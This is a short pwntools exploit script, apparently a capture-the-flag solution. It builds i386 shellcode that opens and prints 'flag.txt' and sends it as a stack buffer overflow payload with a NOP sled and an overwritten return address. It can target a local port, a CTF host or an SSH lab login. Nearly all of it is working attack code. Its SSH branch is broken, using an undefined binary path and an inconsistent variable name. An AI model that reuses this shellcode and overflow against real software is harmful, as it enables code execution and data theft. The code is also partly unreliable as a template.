from pwn import *  # Import pwntools
####################
#### CONNECTION ####
####################
LOCAL = True
REMOTETTCP = False
REMOTESSH = False


if LOCAL:
    P = remote('127.0.0.1',9999) # start the vuln binary

elif REMOTETTCP:
    P = remote('challenge.ctf.games',32762) # start the vuln binary
 

elif REMOTESSH:
    ssh_shell = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0', port=2220)
    p = ssh_shell.process(REMOTE_BIN) # start the vuln binary
    elf = ELF(LOCAL_BIN)# Extract data from binary
    rop = ROP(elf)# Find ROP gadgets
    

shellcode = asm('\n'.join([
    'add esp,0x44',
    'pop ebp',
    'xor eax, eax',
    'push eax',
    'push %d' % u32(b'.txt'),
    'push %d' % u32(b'flag'),
    'push 0x5',
    'pop eax',
    'mov ebx, esp',
    'xor ecx, ecx',
    'xor edx, edx',
    'int 0x80',
    'mov ebx, eax',
    'xor eax, eax',
    'push 0x3',
    'pop eax',
    'mov ecx, 0x0804a008',
    'push 0x1d',
    'pop edx',
    'int 0x80',
    'xor eax,eax',
    'push eax',
    'push 0x1d',
    'push 0x0804a008',
    'push ebp',
    'push 0x0804935b',
    'ret',
]),arch = 'i386')
print(shellcode)
P.sendline(b'\x90'*0x20+shellcode+b'A'*(0x414-len(shellcode)-0x20)+p32(0xffffd088-0x410))
P.interactive() #Interact with your shell :)






